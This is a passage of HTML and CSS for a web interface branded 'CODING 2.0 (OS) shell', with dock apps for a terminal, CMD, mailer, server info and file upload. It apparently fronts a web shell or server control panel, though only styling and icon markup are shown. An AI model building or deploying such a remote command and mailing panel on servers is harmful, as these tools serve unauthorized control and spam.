.dock-terminal.app-icon, .dock-notes.app-icon, .dock-browser.app-icon, .dock-cmd.app-icon, .dock-wallpaper.app-icon, .dock-mailer.app-icon, .dock-settings.app-icon, .dock-errors.app-icon, .dock-apptools.app-icon, .dock-clean.app-icon { width:48px; height:48px; border-radius:14px; background: linear-gradient(180deg, rgba(40,44,52,0.92), rgba(20,24,28,0.92)); backdrop-filter: blur(6px) saturate(115%); box-shadow: inset 0 1px 0 rgba(255,255,255,0.06), 0 10px 20px rgba(0,0,0,0.45); border: 1px solid rgba(255,255,255,0.06); left:50%; top:50%; transform: translate(-50%, -50%); }
        /* Wallpaper dock uses same placement as others when minimized */
.dock-terminal.app-icon:hover, .dock-notes.app-icon:hover, .dock-browser.app-icon:hover, .dock-cmd.app-icon:hover, .dock-wallpaper.app-icon:hover, .dock-mailer.app-icon:hover, .dock-settings.app-icon:hover, .dock-errors.app-icon:hover, .dock-apptools.app-icon:hover, .dock-clean.app-icon:hover { background: linear-gradient(180deg, rgba(48,52,60,0.94), rgba(28,32,36,0.94)); box-shadow: inset 0 1px 0 rgba(255,255,255,0.08), 0 12px 22px rgba(0,0,0,0.5); }
        .dock-terminal .material-symbols-rounded, .dock-browser .material-symbols-rounded, .dock-wallpaper .material-symbols-rounded { font-size:28px; color:#ffffff; }
        .dock-notes .material-symbols-rounded { font-size:28px; color: Khaki; }
        .dock-cmd .material-symbols-rounded { font-size:28px; color:#ffffff; }
.dock-mailer .material-symbols-rounded { font-size:28px; color: Chartreuse; }
        .dock-settings .material-symbols-rounded { font-size:28px; color:#cfd6df; }
        .dock-errors .material-symbols-rounded { font-size:28px; color:#E53935; }
            .dock-apptools .apptools-icon { width:28px; height:28px; border-radius:6px; display:block; }
        .dock-clean .clean-icon { width:28px; height:28px; }
        .dock-terminal .logo-spinner { width:28px; height:28px; }
        .dock-browser .browser-os-icon, .dock-browser .browser-os-icon-2 { width:28px; height:28px; }
        /* Visible labels for dock icons */
        .dock-terminal::after, .dock-notes::after, .dock-browser::after, .dock-cmd::after, .dock-wallpaper::after, .dock-mailer::after, .dock-settings::after, .dock-errors::after, .dock-apptools::after, .dock-clean::after {
            content: attr(data-label);
            position: absolute;
            top: calc(100% + 6px);
            left: 50%;
            transform: translateX(-50%);
            font-size: 11px;
            line-height: 1;
            color: #ffffff;
            background: rgba(20,22,26,0.22);
            backdrop-filter: blur(6px) saturate(1.2);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 10px;
            padding: 4px 8px;
            white-space: nowrap;
            pointer-events: none;
            opacity: 1;
            font-weight: 600;
        }
        /* Flip label above when near bottom */
.dock-terminal.label-top::after, .dock-notes.label-top::after, .dock-browser.label-top::after, .dock-cmd.label-top::after, .dock-wallpaper.label-top::after, .dock-mailer.label-top::after, .dock-settings.label-top::after { top: auto; bottom: calc(100% + 6px); }
        .dock-terminal .dock-label, .dock-notes .dock-label, .dock-browser .dock-label, .dock-cmd .dock-label, .dock-wallpaper .dock-label, .dock-mailer .dock-label, .dock-settings .dock-label { display:none; }
        /* Minimized layout: hide main sections */
        body.minimized .terminal-chrome,
        body.minimized .container { display:none !important; }
        /* Centered section titles with icons */
        .section-title { display:flex; align-items:center; justify-content:center; gap:8px; font-size:18px; margin:18px 0; color:var(--text); }
        .section-title .material-symbols-rounded { font-size:22px; color:var(--accent); vertical-align: -4px; }
        .form-wrap { max-width: 720px; margin: 12px auto; }
        .editor-actions { text-align:center; }
        /* Upload UI */
        .upload-row { display:none; } /* Hide add_circle and arrow_back icons */
        .upload-row .material-symbols-rounded { font-size:22px; }
        .upload-pill { display:flex; align-items:center; justify-content:center; gap:0; padding:20px; border:1px dashed var(--border); border-radius:9999px; background: transparent; color:#cbd5e1; cursor:pointer; }
        /* Upload icon color: blue */
        .upload-pill .material-symbols-rounded { font-size:32px; color:#3b82f6; }
        .term-action.term-upload .material-symbols-rounded { color:#3b82f6; }
        .upload-label { display:none; } /* Hide "Choose a file..." text */
        /* Ellipsis for long filenames in listing */
        .name-ellipsis { display:block; width:100%; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
        /* Search-selected highlight to match editor selection effect */
        .name-cell .name-ellipsis.search-selected,
        .name-cell .folder-link.search-selected {
            background: Chartreuse;
            color: #000000 !important;
            border-radius: 4px;
            padding: 0 4px;
            box-shadow: 0 0 0 1px rgba(124,252,0,0.35);
            text-shadow: none;
        }
        .upload-pill input[type="file"] { position:absolute; left:-9999px; width:1px; height:1px; opacity:0; }
        /* Logo: CODING 2.0.. with animated O */
        .logo-title { display:flex; align-items:center; gap:8px; font-size:22px; font-weight:700; letter-spacing:0.5px; color:var(--text); margin:0 0 6px; font-family: 'Ubuntu', 'Segoe UI', Arial, sans-serif; text-transform: uppercase; text-shadow: 1px 1px 2px rgba(0,0,0,0.1); }
        .logo-text { display:inline-block; }
        .logo-o { display:inline-flex; width:24px; height:24px; align-items:center; justify-content:center; }
        .logo-spinner { width:24px; height:24px; }
        .logo-spinner circle.base { opacity:0.28; }
.logo-spinner circle.dot { fill: Chartreuse; }
        .logo-spinner circle.spin { transform-origin:12px 12px; animation: spin 1.2s linear infinite; }
        .logo-credit { font-size: 11px; font-weight: normal; color: #666; font-family: Arial, sans-serif; letter-spacing: 1px; margin-top: 2px; text-transform: lowercase; text-shadow: none; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        /* Typewriter hacking-style effect for footer title */
        .typewriter { display:flex; align-items:center; justify-content:center; gap:8px; font-family: 'Courier New', 'Monaco', 'Menlo', monospace; color:#cfd6df; padding:10px 0; }
.typewriter .material-symbols-rounded { color: Chartreuse; font-size:20px; }
.typewriter .tw-text { display:inline-block; overflow:hidden; white-space:nowrap; border-right: 2px solid Chartreuse; width: 0ch; }
        @keyframes tw-type { from { width: 0ch; } to { width: var(--chars, 24)ch; } }
        @keyframes tw-cursor { 0% { opacity:1; } 49% { opacity:1; } 50% { opacity:0; } 100% { opacity:0; } }
        .typewriter .tw-text { animation: tw-type var(--duration, 2400ms) steps(var(--steps, 24)) both; }
.typewriter .tw-cursor { width:2px; height:1.2em; background: Chartreuse; display:inline-block; animation: tw-cursor 1s step-end infinite; margin-left:2px; }
        /* Unified text size across the UI */
        :root { --textBase: 14px; }
        html { scroll-behavior: smooth; -webkit-text-size-adjust: 100%; text-size-adjust: 100%; }
        header, .container, footer, table, h1, .path, thead th, tbody td, .term-title, .section-title, .command-pill, .logo-title, .logo-credit, .pill { font-size: var(--textBase) !important; }
        input, textarea, select { font-size: var(--textBase) !important; }
        /* Traffic controls styled like term-action buttons */
        .traffic .term-action { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; background:transparent; }
        .traffic .term-action .material-symbols-rounded { font-size:18px; }
        .traffic .term-action:hover { background: rgba(255,255,255,0.06); }
        .traffic .term-action.term-logout { color: DarkRed; }
        .traffic .term-action.term-logout .material-symbols-rounded { color: DarkRed; }
        .traffic .term-action.term-minimize .material-symbols-rounded { color:#ffbd2e; }
        /* About overlay modal */
        #about-overlay { position: fixed; inset:0; background: rgba(0,0,0,0.55); backdrop-filter: blur(2px); display:none; align-items:center; justify-content:center; z-index: 10000; }
        #about-overlay.show { display:flex; }
        .about-modal { width: min(92vw, 560px); border:1px solid var(--border); border-radius: 12px; background: rgba(24,26,32,0.9); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; }
        .about-header { display:flex; align-items:center; justify-content: space-between; padding: 12px 16px; border-bottom:1px solid var(--border); }
        .about-title { display:flex; align-items:center; gap:10px; font-weight:700; }
        .about-body { padding:16px; display:flex; flex-direction:column; gap:12px; }
        .about-logo { display:flex; align-items:center; justify-content:center; }
        .about-desc { text-align:center; color:#cfd6df; }
        .about-meta { display:flex; flex-wrap:nowrap; justify-content:center; gap:14px; color:#94a3b8; }
        .about-meta .item { display:flex; align-items:center; gap:6px; }
        .about-meta .item.latest .material-symbols-rounded { color:#3b82f6; }
        .about-meta .item.system .material-symbols-rounded { color: Chartreuse; }
        .about-meta .item.copyright .material-symbols-rounded { color:#ff5f56; }
        .about-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; background:transparent; color: rgba(255,0,0,0.75); cursor:pointer; }
        .about-close .material-symbols-rounded { font-size:20px; color: DarkRed; }
    </style>
</head>
<body>
    <header>
        <div class="header-bar">
            <div class="logo-area">
                <h1 class="logo-title" aria-label="CODING 2.0">
                    <span class="logo-text">C</span>
                    <span class="logo-o" aria-hidden="true">
                        <svg class="logo-spinner" viewBox="0 0 24 24" role="img" aria-label="O loading">
                            <circle class="base" cx="12" cy="12" r="9" stroke="Chartreuse" stroke-width="3" fill="none" />
                            <circle class="spin" cx="12" cy="12" r="9" stroke="Chartreuse" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="56" stroke-dashoffset="42" />
                            <circle class="dot" cx="12" cy="12" r="2" />
                        </svg>
                    </span>
                    <span class="logo-text">DING 2.0..</span>  <div class="logo-credit">(OS) shell</div>
                </h1>
            </div>
            <div class="app-icons" aria-label="App shortcuts">
                
                <a class="app-icon" href="#" id="wallpaper-trigger" title="Wallpaper" aria-label="Wallpaper" data-label="Wallpaper">
                    <span aria-hidden="true" class="wp-wrap">
                        <span class="design">
                            <span class="circle-1 center color-border">
                                <span class="circle-2 center color-border">
                                    <span class="circle-3 center color-border">
                                        <span class="circle-4 center color-border">
                                            <span class="circle-5"></span>
                                        </span>
                                    </span>
                                </span>
                            </span>
                            <span class="mountain-1 shape shadow"></span>
                            <span class="mountain-2 shape"></span>
                            <span class="mountain-3 shape shadow"></span>
                        </span>
                    </span>
                </a>
                <a class="app-icon" href="#" id="browser-trigger" title="Browser" aria-label="Browser" data-label="Browser">
                    <svg class="browser-os-icon-2" viewBox="0 0 24 24" role="img" aria-label="Browser OS icon alt">
                        <circle class="ring" cx="12" cy="12" r="8" stroke-width="2" fill="none" />
                        <circle class="c-arc" cx="12" cy="12" r="8" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="30" stroke-dashoffset="6" />
                        <circle class="scan" cx="12" cy="12" r="8" stroke-width="2" fill="none" stroke-linecap="round" stroke-dasharray="20" stroke-dashoffset="14" />
                        <circle class="dot" cx="12" cy="12" r="1.8" />
                    </svg>
                </a>
                <a class="app-icon" href="#" id="serverinfo-trigger" title="Server Info" aria-label="Server Info" data-label="Server Info">
                    <svg class="serverinfo-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0 0 50 50" aria-hidden="true" style="fill:Chartreuse;">
                        <path d="M 25.001953 0 C 12.439953 0 4 4.6530469 4 8.9980469 C 4 13.345047 12.439953 18 25.001953 18 C 37.562953 18 46 13.345047 46 8.9980469 C 46 4.6530469 37.562953 -1.1842379e-15 25.001953 0 z M 4 13.609375 L 4 19.150391 C 4 23.424391 12.439953 28 25.001953 28 C 37.562953 28 46 23.424391 46 19.150391 L 46 13.609375 C 42.328 17.363375 34.412953 20 25.001953 20 C 15.588953 20 7.673 17.362375 4 13.609375 z M 4 23.910156 L 4 29.195312 C 4 32.649313 9.517625 36.26925 18.265625 37.53125 L 18.363281 37 L 25.361328 37 C 26.587328 37 27.675172 37.311328 28.576172 37.861328 C 28.683172 37.853328 28.792438 37.847844 28.898438 37.839844 L 29.910156 33 L 36.619141 33 L 35.845703 36.705078 C 42.169703 35.055078 46 32.069312 46 29.195312 L 46 23.910156 C 42.328 27.662156 34.412953 30 25.001953 30 C 15.588953 30 7.673 27.662156 4 23.910156 z M 4 33.955078 L 4 39.150391 C 4 42.363391 8.7725156 45.746516 16.478516 47.228516 L 17.896484 39.529297 C 11.699484 38.680297 6.701 36.715078 4 33.955078 z M 46 33.955078 C 44.861 35.119078 43.312453 36.142 41.439453 37 L 46 37 L 46 33.955078 z M 31.535156 35 L 29.027344 47 L 31.652344 47 L 32.919922 41 L 35.017578 41 C 35.686578 41 36.127984 41.111031 36.333984 41.332031 C 36.538984 41.555031 36.583844 41.975984 36.464844 42.583984 L 35.507812 47 L 38.173828 47 L 39.210938 42.222656 C 39.433938 41.077656 39.265938 40.236563 38.710938 39.726562 C 38.145938 39.208563 37.149062 39 35.664062 39 L 33.324219 39 L 34.158203 35 L 31.535156 35 z M 20.027344 39 L 18 50 L 20.646484 50 L 21.173828 47 L 22.818359 47 C 26.264359 47 28.140797 46.202141 28.841797 43.244141 C 29.444797 40.703141 27.903328 39 25.361328 39 L 20.027344 39 z M 41.027344 39 L 39 50 L 41.646484 50 L 42.173828 47 L 43.818359 47 C 47.264359 47 49.140797 46.202141 49.841797 43.244141 C 50.444797 40.703141 48.903328 39 46.361328 39 L 41.027344 39 z M 22.300781 41 L 24.361328 41 C 26.069328 41 26.428844 41.769953 26.339844 42.626953 C 26.110844 44.832953 24.735859 45 23.255859 45 L 21.546875 45 L 22.300781 41 z M 43.300781 41 L 45.361328 41 C 47.069328 41 47.428844 41.769953 47.339844 42.626953 C 47.110844 44.832953 45.735859 45 44.255859 45 L 42.546875 45 L 43.300781 41 z"/>
                    </svg>
                </a>
                <a class="app-icon" href="#" id="mailer-trigger" title="Mailer" aria-label="Mailer" data-label="Mailer">
                    <svg class="mailer-icon-svg" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0 0 256 256" aria-hidden="true">
                        <defs>
                            <linearGradient x1="18.921" y1="5.715" x2="25.143" y2="26.715" gradientUnits="userSpaceOnUse" id="color-1_OumT4lIcOllS_gr1"><stop offset="0" stop-color="#40d300"></stop><stop offset="1" stop-color="#36a108"></stop></linearGradient>
                            <linearGradient x1="24" y1="15.394" x2="24" y2="28.484" gradientUnits="userSpaceOnUse" id="color-2_OumT4lIcOllS_gr2"><stop offset="0" stop-color="#ffffff"></stop><stop offset="0.24" stop-color="#f8f8f7"></stop><stop offset="1" stop-color="#e3e3e1"></stop></linearGradient>
                            <linearGradient x1="25.886" y1="27.936" x2="37.997" y2="45.269" gradientUnits="userSpaceOnUse" id="color-3_OumT4lIcOllS_gr3"><stop offset="0" stop-color="#3cf44c"></stop><stop offset="1" stop-color="#32e51f"></stop></linearGradient>
                            <linearGradient x1="3.074" y1="27.236" x2="39.962" y2="45.125" gradientUnits="userSpaceOnUse" id="color-4_OumT4lIcOllS_gr4"><stop offset="0" stop-color="#57ea28"></stop><stop offset="1" stop-color="#0bda42"></stop></linearGradient>
                        </defs>
                        <g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal">
                            <g transform="scale(5.33333,5.33333)">
                                <path d="M43,29.452h-38v-12.898c0,-0.686 0.352,-1.325 0.932,-1.691l16.466,-10.4c0.979,-0.618 2.225,-0.618 3.204,0l16.466,10.4c0.58,0.367 0.932,1.005 0.932,1.691z" fill="url(#color-1_OumT4lIcOllS_gr1)"></path>
                                <path d="M39,33h-30v-17c0,-0.552 0.448,-1 1,-1h28c0.552,0 1,0.448 1,1z" fill="url(#color-2_OumT4lIcOllS_gr2)"></path>
                                <path d="M43,17v21.256c0,0.963 -0.794,1.744 -1.774,1.744h-31.666l4.803,-6.327z" fill="url(#color-3_OumT4lIcOllS_gr3)"></path>
                                <path d="M5,17v21.256c0,0.963 0.794,1.744 1.774,1.744h34.453c0.56,0 1.053,-0.26 1.378,-0.658z" fill="url(#color-4_OumT4lIcOllS_gr4)"></path>
                            </g>
                        </g>
                    </svg>
                </a>
                <a class="app-icon" href="#" id="notes-trigger" title="Notes" aria-label="Notes" data-label="Notes">
                    <svg class="notes-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0,0,256,256" aria-hidden="true">
                        <defs><linearGradient x1="28.529" y1="15.472" x2="33.6" y2="10.4" gradientUnits="userSpaceOnUse" id="notes_hdr_gr1"><stop offset="0" stop-color="#3079d6"></stop><stop offset="1" stop-color="#297cd2"></stop></linearGradient><linearGradient x1="39.112" y1="21.312" x2="39.112" y2="26.801" gradientUnits="userSpaceOnUse" id="notes_hdr_gr2"><stop offset="0" stop-color="#dedede"></stop><stop offset="1" stop-color="#d6d6d6"></stop></linearGradient></defs><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(5.33333,5.33333)"><path d="M39,16v25c0,1.105 -0.895,2 -2,2h-26c-1.105,0 -2,-0.895 -2,-2v-34c0,-1.105 0.895,-2 2,-2h17z" fill="#edb90b"></path><path d="M32.5,21h-17c-0.276,0 -0.5,-0.224 -0.5,-0.5v-1c0,-0.276 0.224,-0.5 0.5,-0.5h17c0.276,0 0.5,0.224 0.5,0.5v1c0,0.276 -0.224,0.5 -0.5,0.5z" fill="#057093"></path><path d="M30.5,25h-15c-0.276,0 -0.5,-0.224 -0.5,-0.5v-1c0,-0.276 0.224,-0.5 0.5,-0.5h15c0.276,0 0.5,0.224 0.5,0.5v1c0,0.276 -0.224,0.5 -0.5,0.5z" fill="#057093"></path><path d="M32.5,29h-17c-0.276,0 -0.5,-0.224 -0.5,-0.5v-1c0,-0.276 0.224,-0.5 0.5,-0.5h17c0.276,0 0.5,0.224 0.5,0.5v1c0,0.276 -0.224,0.5 -0.5,0.5z" fill="#057093"></path><path d="M30.5,33h-15c-0.276,0 -0.5,-0.224 -0.5,-0.5v-1c0,-0.276 0.224,-0.5 0.5,-0.5h15c0.276,0 0.5,0.224 0.5,0.5v1c0,0.276 -0.224,0.5 -0.5,0.5z" fill="#057093"></path><path d="M28,5v9c0,1.105 0.895,2 2,2h9z" fill="url(#notes_hdr_gr1)"></path><path d="M39,19.602l-15.899,15.902l-1.233,4.896c-0.111,0.442 0.29,0.843 0.732,0.732l4.897,-1.233l11.503,-11.505z" fill="#000000" opacity="0.05"></path><path d="M39,20.309l-15.059,15.062l-0.547,1.017v0h-0.001l-0.864,3.434c-0.099,0.392 0.256,0.746 0.648,0.648l3.446,-0.868v0v0l1.006,-0.543l11.371,-11.396z" fill="#000000" opacity="0.07"></path><path d="M42.781,22.141l-1.922,-1.921c-0.292,-0.293 -0.768,-0.293 -1.061,0l-0.904,0.905l2.981,2.981l0.905,-0.904c0.293,-0.294 0.293,-0.768 0.001,-1.061" fill="#c94f60"></path><path d="M24.003,36.016l-1.003,3.984l3.985,-1.003l0.418,-3.456z" fill="#f0f0f0"></path><path d="M39.333,26.648l-12.348,12.348l-2.981,-2.981l12.348,-12.348z" fill="#edbe00"></path><path d="M36.349,23.667l2.543,-2.544l2.983,2.981l-2.543,2.544z" fill="url(#notes_hdr_gr2)"></path><path d="M23.508,37.985l-0.508,2.015l2.014,-0.508z" fill="#787878"></path></g></g>
                    </svg>
                </a>
                <a class="app-icon" href="#" id="how-trigger" title="HOW" aria-label="HOW" data-label="HOW">
                    <span class="material-symbols-rounded" aria-hidden="true">help</span>
                </a>
                <a class="app-icon" href="#" id="cmdhelp-trigger" title="CMD Help" aria-label="CMD Help" data-label="CMD Help" style="display:none;">
                    <span class="material-symbols-rounded" aria-hidden="true">menu_book</span>
                </a>
                <a class="app-icon" href="#" id="cmd-trigger" title="CMD" aria-label="CMD" data-label="CMD">
                    <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0 0 48 48" aria-hidden="true">
                        <rect width="14" height="7" x="17" y="8" fill="#999"></rect>
                        <path fill="#666" d="M43,8H31v7h14v-5C45,8.895,44.105,8,43,8z"></path>
                        <path fill="#ccc" d="M5,8c-1.105,0-2,0.895-2,2v5h14V8H5z"></path>
                        <linearGradient id="u8UbA7GmcDgkSbOtELVhra_WbRVMGxHh74X_hdr1" x1="3.594" x2="44.679" y1="13.129" y2="39.145" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#4c4c4c"></stop><stop offset="1" stop-color="#343434"></stop></linearGradient>
                        <path fill="url(#u8UbA7GmcDgkSbOtELVhra_WbRVMGxHh74X_hdr1)" d="M45,13H3v25c0,1.105,0.895,2,2,2h38c1.105,0,2-0.895,2-2V13z"></path>
                        <path d="M10.597,18.314l-2.319,2.319c-0.514,0.514-0.514,1.347,0,1.861l3.978,3.978l-4.033,4.033	c-0.514,0.514-0.514,1.347,0,1.861l2.319,2.319c0.514,0.514,1.347,0.514,1.861,0l7.282-7.283c0.514-0.514,0.514-1.347,0-1.861	l-7.228-7.228C11.944,17.8,11.111,17.8,10.597,18.314z" opacity=".05"></path>
                        <path d="M10.889,18.729l-2.197,2.197c-0.352,0.352-0.352,0.924,0,1.276l4.271,4.271l-4.325,4.325	c-0.352,0.352-0.352,0.924,0,1.276l2.197,2.197c0.353,0.352,0.924,0.352,1.276,0l7.16-7.161c0.352-0.352,0.352-0.924,0-1.276	l-7.106-7.106C11.813,18.376,11.242,18.376,10.889,18.729z" opacity=".07"></path>
                        <linearGradient id="u8UbA7GmcDgkSbOtELVhrb_WbRVMGxHh74X_hdr2" x1="10.135" x2="15.002" y1="32.774" y2="27.907" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#a0a0a0"></stop><stop offset=".569" stop-color="#9e9e9e"></stop><stop offset=".774" stop-color="#979797"></stop><stop offset=".92" stop-color="#8c8c8c"></stop><stop offset="1" stop-color="#818181"></stop></linearGradient>
                        <path fill="url(#u8UbA7GmcDgkSbOtELVhrb_WbRVMGxHh74X_hdr2)" d="M9.053,31.09l6.983-6.983c0.191-0.191,0.501-0.191,0.692,0l2.075,2.075	c0.191,0.191,0.191,0.501,0,0.692l-6.983,6.983c-0.191,0.191-0.501,0.191-0.692,0l-2.075-2.075	C8.862,31.591,8.862,31.281,9.053,31.09z"></path>
                        <path fill="#d0d0d0" d="M11.873,19.143l6.983,6.983c0.191,0.191,0.191,0.501,0,0.692l-2.075,2.075	c-0.191,0.191-0.501,0.191-0.692,0L9.107,21.91c-0.191-0.191-0.191-0.501,0-0.692l2.075-2.075	C11.373,18.952,11.682,18.952,11.873,19.143z"></path>
                        <path d="M22,32v4c0,0.552,0.448,1,1,1h17c0.552,0,1-0.448,1-1v-4c0-0.552-0.448-1-1-1H23	C22.448,31,22,31.448,22,32z" opacity=".05"></path>
                        <path d="M39.909,36.5H23.091c-0.326,0-0.591-0.265-0.591-0.591v-3.818c0-0.326,0.265-0.591,0.591-0.591	c0.326,0,0.591,0.265,0.591,0.591v3.818C40.5,36.235,40.235,36.5,39.909,36.5z" opacity=".07"></path>
                        <path fill="#d4d4d4" d="M23.5,32h16c0.276,0,0.5,0.224,0.5,0.5v3c0,0.276-0.224,0.5-0.5,0.5h-16c-0.276,0-0.5-0.224-0.5-0.5	v-3C23,32.224,23.224,32,23.5,32z"></path>
                    </svg>
                    
                </a>
                <a class="app-icon" href="#" id="errors-trigger" title="Errors" aria-label="Errors" data-label="Errors">
                    <svg class="errors-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0,0,256,256" aria-hidden="true">
                        <g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal">
                            <g transform="scale(5.33333,5.33333)">
                                <path d="M24,44c-0.552,0 -1,-0.448 -1,-1c0,-0.552 0.448,-1 1,-1z" fill="#03c831"></path>
                                <path d="M25,43c0,0.552 -0.448,1 -1,1v-2c0.552,0 1,0.448 1,1z" fill="#0f946e"></path>
                                <circle cx="42" cy="11" r="1" fill="#08d926"></circle>
                                <circle cx="6" cy="11" r="1" fill="#67f033"></circle>
                                <path d="M24,43l0.427,0.907c0,0 15.144,-7.9 18.08,-19.907h-18.507z" fill="#0f946e"></path>
                                <path d="M43,11l-1,-1c-11.122,0 -11.278,-6 -18,-6v20h18.507c0.315,-1.288 0.493,-2.622 0.493,-4c0,-3.144 0,-9 0,-9z" fill="#08d926"></path>
                                <path d="M24,43l-0.427,0.907c0,0 -15.144,-7.9 -18.08,-19.907h18.507z" fill="#03c831"></path>
                                <path d="M5,11l1,-1c11.122,0 11.278,-6 18,-6v20h-18.507c-0.315,-1.288 -0.493,-2.622 -0.493,-4c0,-3.144 0,-9 0,-9z" fill="#67f033"></path>
                            </g>
                        </g>
                    </svg>
                </a>
                <a class="app-icon" href="#" id="apptools-trigger" title="APPTools 1.0" aria-label="APPTools 1.0" data-label="APPTools 1.0">
                    <svg class="apptools-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0 0 256 256" role="img" aria-label="APPTools app store icon">
                        <defs><linearGradient x1="17.08" y1="5" x2="17.08" y2="39.566" gradientUnits="userSpaceOnUse" id="apptools_hdr_gr1"><stop offset="0" stop-color="#00d325"></stop><stop offset="1" stop-color="#0b59a4"></stop></linearGradient><linearGradient x1="30.92" y1="5" x2="30.92" y2="43" gradientUnits="userSpaceOnUse" id="apptools_hdr_gr2"><stop offset="0" stop-color="#d3f135"></stop><stop offset="1" stop-color="#15e23f"></stop></linearGradient></defs><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(5.33333,5.33333)"><path d="M17.28,24l3.723,4.595c0.593,0.732 0.595,1.779 0.004,2.513l-6.508,8.084c-0.4,0.497 -1.157,0.497 -1.558,0l-10.217,-12.683c-1.18,-1.465 -1.18,-3.553 0,-5.018l12.676,-15.741c0.38,-0.48 0.95,-0.75 1.56,-0.75h14.08c0.48,0 0.93,0.16 1.28,0.46z" fill="url(#apptools_hdr_gr1)"></path><path d="M32.32,5.46l-8.96,11.05l-8.34,-10.28l0.38,-0.48c0.38,-0.48 0.95,-0.75 1.56,-0.75z" fill="#000000" opacity="0.05"></path><path d="M32.32,5.46l-8.64,10.65l-8.35,-10.28l0.07,-0.08c0.38,-0.48 0.95,-0.75 1.56,-0.75z" fill="#000000" opacity="0.07"></path><path d="M45.276,21.491c1.179,1.465 1.179,3.553 0,5.018l-12.676,15.741c-0.38,0.48 -0.95,0.75 -1.56,0.75h-14.264c-0.589,0 -0.915,-0.683 -0.544,-1.141l14.488,-17.859l-15.04,-18.54c0.35,-0.3 0.8,-0.46 1.28,-0.46h14.08c0.61,0 1.18,0.27 1.56,0.75z" fill="url(#apptools_hdr_gr2)"></path></g></g>
                    </svg>
                </a>
                <a class="app-icon" href="#" id="clean-trigger" title="Clean OS" aria-label="Clean OS" data-label="Clean OS">
                    <svg class="clean-icon" viewBox="0 0 24 24" role="img" aria-label="Clean OS icon">
                        <defs>
                            <linearGradient id="cleanGrad" x1="0" y1="0" x2="1" y2="1">
                                <stop offset="0%" stop-color="Chartreuse"/>
                                <stop offset="100%" stop-color="Chartreuse"/>
                            </linearGradient>
                        </defs>
                        <g fill="none" stroke="url(#cleanGrad)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path class="broom-stick" d="M4 20 L18 6"/>
                            <path class="broom-head" d="M16 8 C15 10, 13 12, 11 13"/>
                            <path class="broom-bristle" d="M12 12 C11 13, 9 14, 7 15"/>
                            <circle class="sparkle s1" cx="8" cy="6" r="1"/>
                            <circle class="sparkle s2" cx="20" cy="12" r="1.2"/>
                            <circle class="sparkle s3" cx="12" cy="20" r="1"/>
                        </g>
                    </svg>
                </a>
                <a class="app-icon" href="#" id="trash-trigger" title="Trash" aria-label="Trash" data-label="Trash">
                    <svg class="trash-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0 0 48 48" role="img" aria-label="Trash icon">
                        <linearGradient id="hibLWC3zcZfthEtNaop4ja_ZPraH6dHmMUK_gr1" x1="17" x2="37" y1="9.395" y2="9.395" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#eba601"></stop><stop offset="1" stop-color="#c18310"></stop></linearGradient>
                        <path fill="url(#hibLWC3zcZfthEtNaop4ja_ZPraH6dHmMUK_gr1)" d="M37,9l-6.624-6.624c-0.766-0.766-2.003-0.783-2.79-0.038L17,12.368V17h20V9z"></path>
                        <linearGradient id="hibLWC3zcZfthEtNaop4jb_ZPraH6dHmMUK_gr2" x1="11" x2="32" y1="7.288" y2="7.288" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#ffd056"></stop><stop offset=".293" stop-color="#fccb4e"></stop><stop offset=".719" stop-color="#f5be38"></stop><stop offset="1" stop-color="#efb423"></stop></linearGradient>
                        <path fill="url(#hibLWC3zcZfthEtNaop4jb_ZPraH6dHmMUK_gr2)" d="M21.819,0.561c-0.734-0.734-1.92-0.75-2.673-0.036L11,8.242v6.333h21v-3.833L21.819,0.561z"></path>
                        <path fill="#76cae7" d="M38,8H10c-1.105,0-2,0.895-2,2v1h32v-1C40,8.895,39.105,8,38,8z"></path>
                        <linearGradient id="hibLWC3zcZfthEtNaop4jc_ZPraH6dHmMUK_gr3" x1="16.313" x2="31.386" y1="8.394" y2="40.021" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#489fd8"></stop><stop offset="1" stop-color="#2e75bb"></stop></linearGradient>
                        <path fill="url(#hibLWC3zcZfthEtNaop4jc_ZPraH6dHmMUK_gr3)" d="M38.5,11h-29l1.627,30.108C11.184,42.169,12.061,43,13.124,43h21.752	c1.063,0,1.94-0.831,1.997-1.892L38.5,11z"></path>
